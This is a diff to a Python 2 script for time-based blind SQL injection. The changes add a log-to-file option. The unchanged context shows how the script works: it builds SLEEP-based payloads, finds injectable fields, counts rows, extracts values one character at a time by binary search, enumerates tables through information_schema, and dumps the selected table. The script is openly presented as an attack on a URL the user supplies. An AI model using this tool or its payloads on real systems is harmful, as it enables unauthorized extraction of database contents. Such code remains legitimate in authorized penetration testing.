@@ -19,6 +19,8 @@ COMMENT_SUFF = 1
 AND_SUFF = 2
 
 verbose = 0
+log = 0
+LOG_FILE_NAME = 'log.txt'
 
 
 # Converte due liste in un dizionario, fields e' l'indice e values i valori
@@ -199,6 +201,8 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
     table = db_name + '.' + table_name
     sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
     query = 'SELECT COUNT(*) FROM {}'
+    
+    file = ''
 
     if vuln_type != NO_SUFF:
         sql_inj = '\'' + sql_inj
@@ -216,6 +220,12 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
         print
         print 'Determinating number of rows of table: ' + table_name
         print
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('\n')
+        file.write('Determinating number of rows of table: ' + table_name)
+        file.write('\n')
+        file.write('\n')
     
     found = 0
     count = 0
@@ -223,6 +233,9 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
         m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(table), str(count), str(sleep_time))
         if verbose:
             print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
+        if log:
+            file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
+            file.write('\n')
         elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
         if elapsed >= sleep_time:
             found = 1
@@ -231,8 +244,15 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
 
     if verbose:
         print
-        print 'Number of rows: ' + str(count)
+        print table_name + ': ' + str(count) + ' rows'
         print
+
+    if log:
+        file.write('\n')
+        file.write(table_name + ': ' + str(count) + ' rows')
+        file.write('\n')
+        file.write('\n')
+        file.close()
 
     return count
 
@@ -243,6 +263,8 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
     sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
     query = 'SELECT LENGTH({}) FROM {}'
     limit = ' LIMIT {},1 '
+
+    file = ''
     
     if vuln_type != NO_SUFF:
         sql_inj = '\'' + sql_inj
@@ -262,8 +284,14 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
 
     if verbose:
         print
-        print 'Determinating number characters in the field: ' + column_name
+        print 'Determinating number of characters in the field: ' + column_name
         print
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('\n')
+        file.write('Determinating number of characters in the field: ' + column_name)
+        file.write('\n')
+        file.write('\n')
 
     found = 0
     length = 0
@@ -272,6 +300,9 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
         m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, table), str(length), str(sleep_time))
         if verbose:
             print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
+        if log:
+            file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
+            file.write('\n')
         elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
         if elapsed == -1:
             return -1
@@ -284,6 +315,12 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
         print
         print 'Field length: ' + str(length)
         print
+    if log:
+        file.write('\n')
+        file.write('Field length: ' + str(length))
+        file.write('\n')
+        file.write('\n')
+        file.close()
 
     return length
 
@@ -295,6 +332,8 @@ def find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_
     sql_inj = ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'
     query = 'SELECT ORD(MID({},{},1)) FROM {} '
     limit = ' LIMIT {},1 '
+
+    file = ''
 
     if vuln_type != NO_SUFF:
         sql_inj = '\'' + sql_inj
@@ -315,6 +354,12 @@ def find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_
         print
         print 'Determinating values of field: ' + column_name
         print
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('\n')
+        file.write('Determinating values of field: ' + column_name)
+        file.write('\n')
+        file.write('\n')
 
     for i in range(1, db_field_length + 1):
         found = 0
@@ -326,6 +371,9 @@ def find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_
             m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '=', current, sleep_time)
             if verbose:
                 print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
+            if log:
+                file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
+                file.write('\n')
             elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
 
             if elapsed >= sleep_time:
@@ -336,20 +384,34 @@ def find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_
                     print 'Found character: ' + chr(current)
                     print
                     print
+
             else:
                 m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '>', current, sleep_time)
                 if verbose:
                     print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
+                if log:
+                    file.write('{' + vuln_field + ': ' + m_data[vuln_field] + '}')
+                    file.write('\n')
                 elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
                 if elapsed >= sleep_time:
                     low = current
                 else:
                     high = current
 
-        if verbose:
-            print
+    if verbose:
+        print
 
-    return ''.join(data_val)
+    result = ''.join(data_val)
+    if log:
+        file.write('\n')
+        file.write('Value: ' + result)
+        file.write('\n')
+        file.write('\n')
+        file.write('\n')
+        file.close()
+
+
+    return result
 
    
 def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row = '', where_param = '', where_value = ''):
@@ -359,7 +421,7 @@ def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_nam
     
 
 
-
+#### MAIN ####
 
 parser = argparse.ArgumentParser()
 parser.add_argument('url', help = 'The URL on which try the attack.', metavar = '<url>')
@@ -370,6 +432,7 @@ parser.add_argument('values', help = 'The values: [\'value1\',\'value2\',\'value
 parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
 parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
 parser.add_argument('-v', '--verbose', help = 'Set verbose mode', action = 'store_true')
+parser.add_argument('-l', '--log', help = 'Set log mode', action = 'store_true')
 
 args = parser.parse_args()
 
@@ -380,6 +443,7 @@ values = ast.literal_eval(args.values)
 sleep_time = args.sleep
 threads_num = args.threads
 verbose = args.verbose
+log = args.log
 
 if len(fields) != len(values):
     print('Fields and values must have same number of parameters.')
@@ -423,6 +487,15 @@ print
 print 'Starting attack on URL: ' + url
 print
 
+if log:
+    file = open(LOG_FILE_NAME, 'w')
+    file.write('# Starting attack on URL: ' + url + ' #')
+    file.write('\n')
+    file.write('\n')
+    file.write('# Using ' + str(threads_num) + ' thread #')
+    file.write('\n')
+    file.close()
+
 
 # Numero di esecuzioni per determinare il tempo di risposta del server
 rounds = 100
@@ -432,8 +505,18 @@ if not sleep_time:
     print('Evaluating response time...')
     avg_resp_time = evaluate_response_time(url, method, headers, cookies, data, rounds, threads_num)
     sleep_time = evaluate_sleep_time(avg_resp_time)
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('# Average response time: ' + str(avg_resp_time) + ' s #')
+        file.write('\n')
+        file.write('# Using sleep time: ' + str(sleep_time) + ' s #')
+        file.write('\n')
+        file.write('\n')
+        file.close()
 
-print 'Using sleep time: ' + str(sleep_time)
+
+
+print 'Using sleep time: ' + str(sleep_time) + ' s'
 print
 
 
@@ -446,6 +529,11 @@ vuln_fields = vuln.keys()
 
 
 if len(vuln_fields) == 0:
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('\n')
+        file.write('No vulnerable field found')
+        file.close()
     print 'No vulnerable field found'
     sys.exit(0)
 
@@ -477,6 +565,7 @@ print
 
 # Cerco le tabelle del database selezionato
 print 'Looking for tables in ' + db_name + ', please wait...'
+print
 where_param = inf_schema_tables_table_schema
 where_value = db_name
 
@@ -487,7 +576,7 @@ for i in range(rows_count):
 
 
 # Seleziono una tabella #
-choice = print_user_choice_table(tables)
+choice = print_user_choice_table(tables, 'Tables found:')
 table_name = tables[choice]
 print
 print 'Table selected: ' + table_name
@@ -519,9 +608,30 @@ for i in range (rows_count):
     print(d)
     results.append(list_to_dict(columns, d))
 
+if log:
+    file = open(LOG_FILE_NAME, 'a')
+    file.write('Result of dump of ' + table_name +':')
+    file.write('\n')
+    file.close()
+
 if len(results) == 0:
     print 'No data in the table: ' + table_name
+    if log:
+        file = open(LOG_FILE_NAME, 'a')
+        file.write('\n')
+        file.write('No data in the table: ' + table_name)
+        file.close()
     sys.exit(0)
 
+if log:
+    file = open(LOG_FILE_NAME, 'a')
+    file.write('\n')
+    for row in results:
+        file.write(str(row))
+        file.write('\n')
+    file.write('\n')
+    file.close()
+print
+print 'Result of dump of ' + table_name + ':'
 for row in results:
-    print(row)
+    print row
